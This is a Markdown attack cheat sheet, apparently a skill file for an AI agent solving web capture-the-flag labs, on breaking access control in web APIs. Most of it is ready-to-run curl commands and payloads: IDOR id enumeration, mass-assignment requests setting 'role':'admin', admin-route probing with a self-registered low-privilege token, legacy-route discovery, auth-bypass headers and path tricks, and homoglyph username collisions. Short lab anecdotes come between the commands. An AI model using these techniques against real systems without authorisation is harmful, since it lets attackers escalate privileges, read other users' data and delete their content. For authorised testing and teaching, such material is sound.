# Access control — IDOR, mass assignment, auth bypass, shadow APIs

## A. IDOR / BOLA — numeric ids or UUIDs

```bash
for id in 0 1 2 3 100 999 9999; do
  echo "=== id=$id ==="; curl -si "<target>/api/<endpoint>/$id" $AUTH_HEADER
done

curl -si "<target>/api/<endpoint>/00000000-0000-0000-0000-000000000000" $AUTH_HEADER
curl -si "<target>/api/<endpoint>/$((YOUR_ID - 1))" $AUTH_HEADER
curl -si "<target>/api/<endpoint>/$((YOUR_ID + 1))" $AUTH_HEADER
```

**Check what the id space actually is before concluding.** If `/api/resource/4` says "not found" for your *own* id, the route is probably keyed by something else — username, slug, share token. Test with your own known identifier of each type before declaring no IDOR.

## B. Mass assignment — `role` / `isAdmin` / `permissions` / `tier` / `plan`

```bash
# profile update
curl -si -X PUT <target>/api/user/<your-id> $AUTH_HEADER \
  -H 'Content-Type: application/json' -d '{"role":"admin","isAdmin":true,"admin":true}'

# registration with elevated fields
curl -si -X POST <target>/api/register -H 'Content-Type: application/json' \
  -d '{"username":"attacker2","email":"a2@test.com","password":"Test1234!","role":"admin","isAdmin":true}'

# PATCH
curl -si -X PATCH <target>/api/user/<your-id> $AUTH_HEADER \
  -H 'Content-Type: application/json' -d '{"role":"admin"}'
```

After each attempt, **re-fetch your profile to confirm the field actually changed** (a 200 does not mean the write landed) and re-probe every previously-403'd endpoint.

## C. BFLA — the guard that was never mounted on one verb

Section G below defeats a guard that *exists*. This is the other case: a route where
nobody put one. Same path prefix, same app, one verb missing its middleware.

**You cannot see this with your own account.** Register a second, unprivileged user and
re-run every privileged route as that user:

```bash
LOW=$(curl -s -X POST <target>/api/register -H 'Content-Type: application/json' \
  -d '{"username":"lp1","email":"lp1@test.com","password":"Test1234!"}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

for m in GET POST PUT PATCH DELETE; do
  echo "=== $m"; curl -si -X $m <target>/api/admin/<route> -H "Authorization: Bearer $LOW" | head -3
done
```

Or let the harness diff all three identities at once:

```bash
python3 ~/.claude/skills/web-ctf/scripts/probe.py --base <target> \
  --token "$ADMIN_TOKEN" --lowpriv-token "$LOW" --write --paths paths.txt
```

**The tell is inconsistency, not failure.** If three routes under `/api/admin/` answer
the low-priv account `403 Admin access required` and a fourth answers `200`, the app has
told you the group is meant to be guarded and named the one that isn't. Read a lone `200`
against the siblings, never on its own.

**Write verbs are where these live.** `GET` routes get the guard because they are the
ones a developer visits; the `DELETE` behind an admin-panel button is the one that gets
forgotten. `probe.py` skips `PUT`/`PATCH`/`DELETE` without `--write`, so the default run
is blind to exactly the verb that matters — pass `--write` on any `/admin/` prefix.

> **Being handed privileged credentials is a hint, not a shortcut.** When a lab gives you
> `admin:admin`, auth-vs-anonymous is the wrong axis: as admin the vulnerable call
> succeeds (correct behaviour), and anonymously it 401s. Neither is a finding. The creds
> exist to *show you which functions to re-run as a nobody*. On Ottergram every
> `/api/admin/*` route enforced the role except `DELETE /api/admin/posts/:id`, which
> checked only that a token existed — a self-registered account deleted any user's post
> and got the flag in the response body.

## Shadow / legacy API routes

The frontend calling only `/v2/*` does not mean older prefixes are gone. Try the same path under `/api/`, `/v1/`, `/internal/`, no prefix — the versioned route may enforce a role allowlist the legacy one skips (Sokudo: `PUT /v1/profile` filtered `role`, `PUT /api/profile` did not).

Distinguish a real shadow route from SPA fallback by **content-type + body**, never status: JSON payload = real; the identical N-byte `text/html` index = fallback.

## G. Auth bypass on 401/403 endpoints

```bash
curl -si <target>/api/admin/                                        # no token
curl -si <target>/api/admin/ -H "Authorization: Bearer "            # empty
curl -si <target>/api/admin/ -H "Authorization: Bearer null"
curl -si <target>/api/admin/ -H "Authorization: Bearer undefined"
curl -si <target>/api/admin/ -H "Authorization: Basic YWRtaW46YWRtaW4="

# method override
curl -si -X POST <target>/api/admin/ $AUTH_HEADER -H "X-HTTP-Method-Override: GET"
curl -si -X POST <target>/api/admin/ $AUTH_HEADER -H "_method: GET"

# path normalization
curl -si "<target>/api/admin/..%2fusers" $AUTH_HEADER
curl -si "<target>/api/./admin/users" $AUTH_HEADER
curl -si "<target>/API/admin/users" $AUTH_HEADER
```

## Username collision / normalization

Where a privileged check compares a **username string** (not a role column), test collisions:
- fullwidth homoglyphs (U+FF01–FF5E): `ａdmin` → NFKC `admin`
- case variants, leading/trailing whitespace, tab/newline, trailing dot or slash
- zero-width space, dotless `ı`, small-caps `ᴀ`

Quick check: `python3 -c "print('ａdmin'.encode())"` and confirm `.normalize('NFKC')` collapses before spending requests.

**Only pursue this when something indicates username-based authorization.** If `/api/verify-token` returns an explicit `role` field, the check is almost certainly a column lookup and collisions will not work — 16 variants on Tanuki all registered cleanly as separate users with `role: "user"`. Kill it fast and record it.
